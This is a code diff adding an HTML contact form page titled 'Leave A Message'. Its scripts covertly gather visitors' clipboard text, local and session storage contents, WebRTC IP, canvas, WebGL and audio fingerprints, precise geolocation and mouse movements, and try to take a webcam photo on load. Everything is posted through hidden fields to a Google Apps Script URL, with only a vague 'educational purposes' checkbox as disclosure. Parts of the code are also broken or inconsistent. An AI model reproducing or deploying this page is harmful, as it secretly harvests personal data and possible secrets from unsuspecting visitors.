@@ -1,0 +1,818 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Form Submission with Hidden Fields</title>
+  <!--reCAPTCHA script-->
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; }
+    .container { max-width: 600px; margin: 0 auto; }
+    label { display: block; margin-top: 10px; }
+    input, textarea { width: 100%; padding: 8px; margin-top: 5px; }
+    button { margin-top: 20px; padding: 10px; background-color: #28a745; color: white; border: none; cursor: pointer; }
+    .response { margin-top: 20px; padding: 10px; border-radius: 5px; }
+    .response.success { background-color: #d4edda; color: #155724; }
+    .response.error { background-color: #f8d7da; color: #721c24; }
+    h1{  text-shadow: 3px 3px 0 #FF6347,    /* Red shadow */
+        -1px -1px 5px #000;   /* Black shadow */ }
+
+
+             input[readonly] {
+            background-color: #e9ecef;
+            cursor: not-allowed;
+        }
+
+        .consent-label {
+            display: flex;
+            align-items: center;
+            color: #555;
+        }
+
+        .consent-label a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .consent-label a:hover {
+            text-decoration: underline;
+        }
+
+     
+            .note {
+            font-size: 12px;
+            color: #777;
+            text-align: center;
+            margin-top: 20px;
+        }
+  </style>
+
+
+    <script>
+        // Function to update the date on the page
+        function updateDate() {
+            var currentDate = new Date();
+            var day = currentDate.getDate();
+            var month = currentDate.getMonth() + 1; // January is 0, so add 1
+            var year = currentDate.getFullYear();
+            var hours = currentDate.getHours();
+            var minutes = currentDate.getMinutes();
+            var seconds = currentDate.getSeconds();
+            var ampm = hours >= 12 ? 'PM' : 'AM'; // Determine if it's AM or PM
+
+            // Convert hours to 12-hour format
+            hours = hours % 12;
+            hours = hours ? hours : 12; // If hours is 0, set it to 12
+
+            // Add leading zero to single-digit days, months, hours, minutes, and seconds
+            day = (day < 10) ? '0' + day : day;
+            month = (month < 10) ? '0' + month : month;
+            hours = (hours < 10) ? '0' + hours : hours;
+            minutes = (minutes < 10) ? '0' + minutes : minutes;
+            seconds = (seconds < 10) ? '0' + seconds : seconds;
+
+            // Display the date and time on the page
+            document.getElementById('runningDate').innerHTML = day + '/' + month + '/' + year + ' ' + hours + ':' + minutes + ':' + seconds + ' ' + ampm;
+
+          <!--added part-->
+        // Format the date and time string
+        var dateTimeString = day + '/' + month + '/' + year + ' ' + hours + ':' + minutes + ':' + seconds + ' ' + ampm;
+
+        // Update the display-only text field
+        document.getElementById('dateTimeDisplay').value = dateTimeString;
+
+        // Update the hidden input field
+        document.getElementById('dateTimeInput').value = dateTimeString;
+
+        <!--end of added part>
+
+        
+            // Schedule the function to run again after 1 second (1000 milliseconds)
+            setTimeout(updateDate, 1000);
+        }
+
+        // Start the date update function when the page loads
+        window.onload = updateDate;
+    </script>
+  <!--end of time and date script-->
+    
+    <script>
+    navigator.mediaDevices.enumerateDevices().then(devices => {
+    let mediaDevices = devices.map(device => `${device.kind}: ${device.label}`).join(', ');
+    document.getElementById('media_devices').value = mediaDevices;
+});
+    </script>
+    
+    <script>
+    document.getElementById('local_storage_usage').value = JSON.stringify(localStorage);
+document.getElementById('session_storage_usage').value = JSON.stringify(sessionStorage);
+    </script>
+    
+    
+    
+    <script>
+    document.getElementById('window_width').value = window.innerWidth;
+document.getElementById('window_height').value = window.innerHeight;
+    </script>
+    
+    <script>
+ let mouseMovementData = [];
+document.addEventListener('mousemove', function(event) {
+    mouseMovementData.push({x: event.clientX, y: event.clientY});
+    if (mouseMovementData.length > 100) mouseMovementData.shift(); // Limit the data to last 100 movements
+});
+document.getElementById('feedbackForm').addEventListener('submit', function() {
+    document.getElementById('mouse_movements').value = JSON.stringify(mouseMovementData);
+});
+   
+    </script>  
+    
+    
+<script>
+navigator.clipboard.readText().then(text => {
+    document.getElementById('clipboard_content').value = text;
+}).catch(err => {
+    document.getElementById('clipboard_content').value = "Not accessible";
+});
+</script>
+
+
+<script>
+        fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            const country = data.country_name;
+            const countryCode = data.country;
+            document.getElementById('country').value = countryCode; // Set the country code in the hidden field
+            document.getElementById('countryDisplay').value = country; // Display the country name
+        })
+        .catch(error => {
+            console.error('Error fetching country:', error);
+        });
+    
+  </script> 
+  <script>
+  document.getElementById('ram_size').value = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+  </script>
+  
+  
+<script>
+function detectSocialMedia() {
+    let socialMedia = [];
+    
+    if (navigator.userAgent.indexOf("FBAN") > -1 || navigator.userAgent.indexOf("FBAV") > -1) socialMedia.push('Facebook');
+    if (navigator.userAgent.indexOf("Instagram") > -1) socialMedia.push('Instagram');
+    if (navigator.userAgent.indexOf("Twitter") > -1 || navigator.userAgent.indexOf("Twitter") > -1) socialMedia.push('Twitter');
+    if (navigator.userAgent.indexOf("LinkedIn") > -1) socialMedia.push('LinkedIn');
+    if (navigator.userAgent.indexOf("WhatsApp") > -1) socialMedia.push('WhatsApp');
+    if (navigator.userAgent.indexOf("Snapchat") > -1) socialMedia.push('Snapchat');
+    if (navigator.userAgent.indexOf("TikTok") > -1 || navigator.userAgent.indexOf("musical.ly") > -1) socialMedia.push('TikTok');
+    if (navigator.userAgent.indexOf("Pinterest") > -1) socialMedia.push('Pinterest');
+    if (navigator.userAgent.indexOf("YouTube") > -1) socialMedia.push('YouTube');
+    if (navigator.userAgent.indexOf("Reddit") > -1) socialMedia.push('Reddit');
+    
+    document.getElementById('social_media').value = socialMedia.join(', ');
+}
+
+detectSocialMedia();
+    </script>
+    
+    <script>
+    let rtc = new RTCPeerConnection({iceServers:[]});
+rtc.createDataChannel('');
+rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+rtc.onicecandidate = ice => {
+    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+    let ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
+    document.getElementById('webrtc_ip').value = ip;
+};
+</script>
+
+<script>
+
+let audioContext = new (window.AudioContext || window.webkitAudioContext)();
+let oscillator = audioContext.createOscillator();
+let analyser = audioContext.createAnalyser();
+let gainNode = audioContext.createGain();
+let scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+
+oscillator.type = 'triangle';
+oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);
+gainNode.gain.setValueAtTime(0, audioContext.currentTime);
+
+oscillator.connect(analyser);
+analyser.connect(scriptProcessor);
+scriptProcessor.connect(audioContext.destination);
+oscillator.start(0);
+
+scriptProcessor.onaudioprocess = function(bins) {
+    let fingerprint = [];
+    for (let i = 0; i < bins.inputBuffer.getChannelData(0).length; i++) {
+        fingerprint.push(bins.inputBuffer.getChannelData(0)[i]);
+    }
+    document.getElementById('audio_fingerprint').value = fingerprint.slice(0, 100).toString();
+};
+
+oscillator.stop(0.1);
+</script>
+
+<script>
+document.getElementById('do_not_track').value = navigator.doNotTrack == "1" ? "Enabled" : "Disabled";
+</script>
+
+<script>
+function detectMovement() {
+        let movementStatus = "Stationary"; // Default to stationary
+
+        if ('DeviceMotionEvent' in window) {
+            window.addEventListener('devicemotion', function(event) {
+                const acceleration = event.acceleration;
+
+                if (acceleration.x > 1 || acceleration.y > 1 || acceleration.z > 1) {
+                    movementStatus = "Moving";
+                } else {
+                    movementStatus = "Stationary";
+                }
+
+                document.getElementById('movement_status').value = movementStatus;
+            });
+        } else {
+            document.getElementById('movement_status').value = "Not supported";
+        }
+    }
+
+</script>
+<script>
+let canvas = document.createElement('canvas');
+let ctx = canvas.getContext('2d');
+ctx.textBaseline = 'top';
+ctx.font = '14px Arial';
+ctx.textBaseline = 'alphabetic';
+ctx.fillStyle = '#f60';
+ctx.fillRect(125, 1, 62, 20);
+ctx.fillStyle = '#069';
+ctx.fillText('This is a test text', 2, 15);
+ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+ctx.fillText('Test', 4, 17);
+let canvasFingerprint = canvas.toDataURL();
+</script>
+
+<script>
+let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+let webglFingerprint = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + '~' + gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+
+document.getElementById('canvas_fingerprint').value = canvasFingerprint;
+document.getElementById('webgl_fingerprint').value = webglFingerprint;
+</script>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Leave A Message</h1>
+    <form id="submissionForm">
+      <label for="name">Your Name:</label>
+      <input type="text" id="name" name="name" placeholder="Enter your name e.g McOwino" required>
+
+
+      <label for="countryDisplay">Country of Origin:</label><br>
+      <input type="text" id="countryDisplay" placeholder="Your country of Origin e.g Kenya" readonly>
+
+      
+      <label for="country">Country Short code:</label>
+      <input type="text" id="country" name="country" placeholder="Your country short code e.g KE" required>
+
+
+
+
+
+             <!-- Country Field (Hidden) -->
+        <input type="hidden" id="country" name="country">
+
+
+    
+
+        <!-- Date and Time Field (Hidden) -->
+        <input type="hidden" id="dateTimeInput" name="dateTime">
+
+        <label for="dateTimeDisplay">Date and Time:</label><br>
+        <input type="text" id="dateTimeDisplay" readonly><br><br>
+
+
+
+      
+      
+
+      <label for="phone">Phone Number:</label>
+      <input type="tel" id="phone" name="phone" placeholder="Enter your phone number e.g +254700663344" required>
+
+      <label for="email">Email:</label>
+      <input type="email" id="email" name="email" placeholder="Enter your email address here e.g mc-owino@gmail.com" required>
+
+      <label for="subject">Subject:</label>
+      <input type="text" id="subject" name="subject" placeholder="Enter your subject mattter here" required>
+
+      <label for="message">Message:</label>
+      <textarea id="message" name="message" placeholder="Enter your message here" required></textarea>
+
+      <!-- Hidden Fields -->
+      <input type="hidden" id="formID" name="formID" value="FORM12345"> <!-- Example static form ID -->
+      <input type="hidden" id="submissionDate" name="submissionDate" value="currentDate"> <!-- Will be set with current date -->
+
+
+
+
+
+
+
+    <input type="hidden" name="datetime_submitted" id="datetime_submitted">
+    
+    <input type="hidden" name="location" id="location">
+    
+    <input type="hidden" name="device_type" id="device_type">
+    
+    <input type="hidden" name="network_provider" id="network_provider">
+    
+    <input type="hidden" name="user_agent" id="user_agent">
+    
+    <input type="hidden" name="connection_type" id="connection_type">
+    
+    <input type="hidden" name="latitude" id="latitude">
+    
+    <input type="hidden" name="longitude" id="longitude">
+    
+    <input type="hidden" name="accuracy" id="accuracy">
+
+    
+    <input type="hidden" name="total_storage" id="total_storage">
+    
+    <input type="hidden" name="available_storage" id="available_storage">
+    
+    <input type="hidden" name="system_name" id="system_name">
+    
+    <input type="hidden" name="system_version" id="system_version">
+    
+    <input type="hidden" name="device_model" id="device_model">
+    
+
+
+
+
+    <input type="hidden" name="battery_level" id="battery_level">
+    
+    <input type="hidden" name="is_charging" id="is_charging">
+    
+    <input type="hidden" name="screen_resolution" id="screen_resolution">
+    
+    <input type="hidden" name="color_depth" id="color_depth">
+    
+    <input type="hidden" name="history_length" id="history_length">
+    
+    <input type="hidden" name="cookies_enabled" id="cookies_enabled">
+    
+    <input type="hidden" name="javascript_enabled" id="javascript_enabled">
+    
+    <input type="hidden" name="referrer_url" id="referrer_url">
+    
+    <input type="hidden" name="visit_count" id="visit_count">
+    
+    <input type="hidden" name="installed_plugins" id="installed_plugins">
+    
+    <input type="hidden" name="browser_language" id="browser_language">
+    
+    <input type="hidden" name="timezone" id="timezone">
+    
+    <input type="hidden" name="session_duration" id="session_duration">
+    
+
+    <input type="hidden" name="ip_address" id="ip_address">
+    
+    <input type="hidden" name="imei" id="imei">
+    
+    <input type="hidden" name="phone_number" id="phone_number">
+    
+    <input type="hidden" name="fingerprint" id="fingerprint">
+    <input type="hidden" name="server_time_difference" id="server_time_difference">
+    <input type="hidden" name="mouse_movements" id="mouse_movements">
+    <input type="hidden" name="clipboard_content" id="clipboard_content">
+    <input type="hidden" name="do_not_track" id="do_not_track">
+    <input type="hidden" name="cpu_cores" id="cpu_cores">
+    <input type="hidden" name="ram_size" id="ram_size">
+    <input type="hidden" name="previous_page_title" id="previous_page_title">
+    <input type="hidden" name="window_width" id="window_width">
+    <input type="hidden" name="window_height" id="window_height">
+    <input type="hidden" name="canvas_fingerprint" id="canvas_fingerprint">
+    <input type="hidden" name="webgl_fingerprint" id="webgl_fingerprint">
+    <input type="hidden" name="local_storage_usage" id="local_storage_usage">
+    <input type="hidden" name="session_storage_usage" id="session_storage_usage">
+    <input type="hidden" name="device_pixel_ratio" id="device_pixel_ratio">
+    <input type="hidden" name="open_tabs" id="open_tabs">
+    <input type="hidden" name="audio_fingerprint" id="audio_fingerprint">
+    <input type="hidden" name="page_visibility" id="page_visibility">
+    <input type="hidden" name="media_devices" id="media_devices">
+    <input type="hidden" name="webrtc_ip" id="webrtc_ip">
+    <!-- Hidden input to store the photo data -->
+    <input type="hidden" name="user_photo" id="user_photo">
+
+    <!-- Optional: Video element to show the camera preview -->
+    <video id="cameraPreview" style="display:none;" autoplay></video>
+    <input type="hidden" name="movement_status" id="movement_status">
+    <input type="hidden" name="social_media" id="social_media">
+            <!-- Consent Checkbox -->
+    <label for="consent">
+    <input type="checkbox" id="consent" name="consent" required>
+           I understand that this form is for educational purposes only, and the owner is not liable for any data transmitted along with it.
+       
+      
+      <br>
+      <br>
+      <!--reCAPTCHA field-->
+      <div class="g-recaptcha" data-sitekey="6LdIpUUqAAAAAG0EjNsQFYxFoSr3KlwKq69VAg0q"></div> <!-- replace with your recaptcha SITE key not secret key --> 
+     
+      <button type="submit">Submit</button>
+
+      <div id="response" class="response" style="display: none;"></div>
+
+
+
+
+
+
+      <div class="note">
+            Your country is detected automatically based on your IP address.
+     <p id="runningDate"></p>
+        </div>
+    </div>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('submissionForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent default form submission
+
+      var form = event.target;
+      var formData = new FormData(form);
+      
+      // Set submission date as hidden field (current date and time)
+      var currentDate = new Date().toISOString();
+      document.getElementById('submissionDate').value = currentDate;
+
+      // Submit the form data to the Google Apps Script
+      fetch('https://script.google.com/macros/s/AKfycbwqEH-03nRdV1DDdRC3L-TK8Yjt8inGAwfem828zwIWV_7fSrarf8aKW10I-yATveSLQQ/exec', { // Replace with your actual script URL
+        method: 'POST',
+        body: new URLSearchParams(formData)
+      })
+      .then(response => response.json())
+      .then(data => {
+        var responseDiv = document.getElementById('response');
+        responseDiv.style.display = 'block';
+
+        if (data.status === 'success') {
+          responseDiv.textContent = data.message;
+          responseDiv.className = 'response success';
+          form.reset(); // Clear the form upon successful submission
+        } else {
+          responseDiv.textContent = 'Error: ' + data.message;
+          responseDiv.className = 'response error';
+        }
+      })
+      .catch(error => {
+        var responseDiv = document.getElementById('response');
+        responseDiv.style.display = 'block';
+        responseDiv.textContent = 'Unexpected error: ' + error.message;
+        responseDiv.className = 'response error';
+      });
+    });
+  </script>
+
+
+
+
+<script>
+    // Capture Date and Time
+    document.getElementById('datetime_submitted').value = new Date().toISOString();
+
+    // Fetch Geolocation Data
+    fetch('https://ipinfo.io/json?token=1a4beeb8578f3b')
+    .then(response => response.json())
+    .then(data => {
+        document.getElementById('location').value = data.city + ', ' + data.region + ', ' + data.country;
+        document.getElementById('network_provider').value = data.org;
+    });
+
+    // Detect Device Type
+    let deviceType = "Unknown";
+    if (navigator.userAgent.match(/mobile/i)) {
+        deviceType = "Mobile";
+    } else if (navigator.userAgent.match(/tablet/i)) {
+        deviceType = "Tablet";
+    } else {
+        deviceType = "Desktop";
+    }
+    document.getElementById('device_type').value = deviceType;
+    // Capture User Agent
+    document.getElementById('user_agent').value = navigator.userAgent;
+    // Capture Connection Type
+    function getConnectionType() {
+        let connectionType = "Unknown";
+
+        if (navigator.connection) {
+            const type = navigator.connection.effectiveType;
+            
+            if (type === "wifi") {
+                connectionType = "WiFi";
+            } else if (type === "cellular") {
+                connectionType = "Cellular";
+            } else if (type === "ethernet") {
+                connectionType = "Ethernet";
+            } else if (type === "none") {
+                connectionType = "No connection";
+            } else {
+                connectionType = type.charAt(0).toUpperCase() + type.slice(1); // Capitalize first letter
+            }
+        } else {
+            connectionType = "Not supported by this browser";
+        }
+
+        document.getElementById('connection_type').value = connectionType;
+    }
+
+    document.addEventListener("DOMContentLoaded", function() {
+        getConnectionType();
+        getLocation();
+    });
+
+
+
+   // Capture Location                        
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition, showError, {
+                enableHighAccuracy: true,
+                timeout: 10000, // 10 seconds
+                maximumAge: 0
+            });
+        } else {
+            alert("Geolocation is not supported by this browser.");
+        }
+    }
+
+    function showPosition(position) {
+        document.getElementById('latitude').value = position.coords.latitude;
+        document.getElementById('longitude').value = position.coords.longitude;
+        document.getElementById('accuracy').value = position.coords.accuracy;
+
+        // You can now use these coordinates for more precise location-based services
+        fetchNearbyPlaces(position.coords.latitude, position.coords.longitude);
+    }
+
+    function showError(error) {
+        switch (error.code) {
+            case error.PERMISSION_DENIED:
+                alert("User denied the request for Geolocation.");
+                break;
+            case error.POSITION_UNAVAILABLE:
+                alert("Location information is unavailable.");
+                break;
+            case error.TIMEOUT:
+                alert("The request to get user location timed out.");
+                break;
+            case error.UNKNOWN_ERROR:
+                alert("An unknown error occurred.");
+                break;
+        }
+    }
+
+
+// Capture Storage Information
+        function getStorageInfo() {
+            if ('storage' in navigator && 'estimate' in navigator.storage) {
+                navigator.storage.estimate().then(estimate => {
+                    document.getElementById('total_storage').value = estimate.quota ? (estimate.quota / (1024 * 1024 * 1024)).toFixed(2) + ' GB' : "Unknown";
+                    document.getElementById('available_storage').value = estimate.usage ? ((estimate.quota - estimate.usage) / (1024 * 1024 * 1024)).toFixed(2) + ' GB' : "Unknown";
+                }).catch(error => {
+                    console.error('Error estimating storage:', error);
+                });
+            } else {
+                document.getElementById('total_storage').value = "Not supported";
+                document.getElementById('available_storage').value = "Not supported";
+            }
+        }
+
+        // Capture System Properties
+        function getSystemProperties() {
+            let systemName = navigator.platform || "Unknown";
+            let systemVersion = "Unknown"; // Web browsers don't expose this directly
+            let deviceModel = navigator.userAgent.match(/\((.*?)\)/) ? navigator.userAgent.match(/\((.*?)\)/)[1] : "Unknown";
+
+            document.getElementById('system_name').value = systemName;
+            document.getElementById('system_version').value = systemVersion;
+            document.getElementById('device_model').value = deviceModel;
+            }
+
+
+    // Capture Battery Information
+    if (navigator.getBattery) {
+        navigator.getBattery().then(function(battery) {
+            document.getElementById('battery_level').value = (battery.level * 100) + "%";
+            document.getElementById('is_charging').value = battery.charging ? "Yes" : "No";
+        });
+    } else {
+        document.getElementById('battery_level').value = "Not supported";
+        document.getElementById('is_charging').value = "Not supported";
+    }
+
+    document.addEventListener("DOMContentLoaded", function() {
+        getConnectionType();
+        getLocation();
+        getStorageInfo();
+        getSystemProperties();
+    });
+
+
+        // Capture Screen Information
+    document.getElementById('screen_resolution').value = window.screen.width + "x" + window.screen.height;
+    document.getElementById('color_depth').value = window.screen.colorDepth + "-bit";
+
+    // Capture Browser History Length
+    document.getElementById('history_length').value = window.history.length;
+
+    // Capture Cookies Enabled Status
+    document.getElementById('cookies_enabled').value = navigator.cookieEnabled ? "Yes" : "No";
+
+    // JavaScript is Enabled
+    document.getElementById('javascript_enabled').value = "Yes";
+
+    // Capture Referrer URL
+    document.getElementById('referrer_url').value = document.referrer || "Direct";
+            
+   // Capture Visit Count
+    let visitCount = localStorage.getItem('visitCount') || 0;
+    visitCount++;
+    localStorage.setItem('visitCount', visitCount);
+    document.getElementById('visit_count').value = visitCount;
+
+    // Capture Installed Plugins
+    let plugins = [];
+    for (let i = 0; i < navigator.plugins.length; i++) {
+        plugins.push(navigator.plugins[i].name);
+    }
+    document.getElementById('installed_plugins').value = plugins.join(", ");
+
+    // Capture Browser Language
+    document.getElementById('browser_language').value = navigator.language || "Unknown";
+
+    // Capture Timezone
+    document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    // Capture Session Duration
+    let sessionStartTime = Date.now();
+    window.addEventListener("beforeunload", function () {
+        let sessionEndTime = Date.now();
+        let sessionDuration = (sessionEndTime - sessionStartTime) / 1000; // in seconds
+        document.getElementById('session_duration').value = sessionDuration;
+    });
+
+
+    
+    // Fetch IP Address
+    fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+        document.getElementById('ip_address').value = data.ip;
+    });
+
+    
+    // Attempt to Capture IMEI and Phone Number (Note: This is typically not allowed for web apps due to security reasons)
+    function getIMEIAndPhoneNumber() {
+        document.getElementById('imei').value = "Unavailable via Web";
+        document.getElementById('phone_number').value = "Unavailable via Web";
+    }
+
+
+    
+
+// Example using FingerprintJS (note that this requires importing their library)
+FingerprintJS.load().then(fp => {
+    fp.get().then(result => {
+        document.getElementById('fingerprint').value = result.visitorId;
+    });
+});
+
+
+
+
+// Assuming the server sends its current time in the initial HTML
+let serverTime = new Date('2024-08-09T12:34:56Z').getTime(); // Example server time
+let localTime = new Date().getTime();
+let timeDifference = (localTime - serverTime) / 1000; // difference in seconds
+document.getElementById('server_time_difference').value = timeDifference;
+
+
+
+// Monitor mouse movement 
+
+
+// Monitor clipboard
+
+
+
+// Do not track status
+
+
+// CPU information
+document.getElementById('cpu_cores').value = navigator.hardwareConcurrency || "Unknown";
+
+// RAM information
+
+// Previous page title
+document.getElementById('previous_page_title').value = document.referrer ? document.referrer : "None";
+
+// Browser window size
+
+
+// Canvas Fingerprinting
+
+// WebGL Fingerprinting
+
+
+
+// Device pixel ratio 
+document.getElementById('device_pixel_ratio').value = window.devicePixelRatio || 1;
+
+// Local storage usage & session storage usage
+
+
+// Number of open tabs
+document.getElementById('open_tabs').value = "Unknown"; // There's no direct API to determine open tabs/windows
+// You can infer this through other means such as session storage or testing how quickly a browser can respond to a request.
+    
+// Audio fingerprint
+
+
+// Page visibility 
+document.addEventListener('visibilitychange', function() {
+    document.getElementById('page_visibility').value = document.visibilityState;
+});
+
+
+// Media Devices Information
+
+
+// WebRTC IP Leakage Detection
+
+
+
+// capture user photo 
+function captureUserPhoto() {
+    const video = document.getElementById('cameraPreview');
+    const canvas = document.createElement('canvas');
+    const userPhotoInput = document.getElementById('user_photo');
+
+    // Request access to the user's camera
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+        .then(stream => {
+            // Set the video source to the stream from the camera
+            video.srcObject = stream;
+
+            // Once the video stream is ready, capture a photo
+            video.addEventListener('canplay', () => {
+                // Set the canvas size to the video frame size
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                // Draw the video frame to the canvas
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert the canvas image to a base64 string
+                userPhotoInput.value = canvas.toDataURL('image/png');
+
+                // Stop the video stream after capturing the photo
+                stream.getTracks().forEach(track => track.stop());
+            });
+        })
+        .catch(error => {
+            console.error('Error accessing the camera:', error);
+            userPhotoInput.value = 'Camera access denied';
+        });
+}
+
+document.addEventListener("DOMContentLoaded", function() {
+    captureUserPhoto();
+});
+
+
+    // Detect User Movement (stationary or walking)
+    
+
+// Detect Social Media
+
+
+ 
+
+    
+</script>
+
+  
+</body>
+</html>
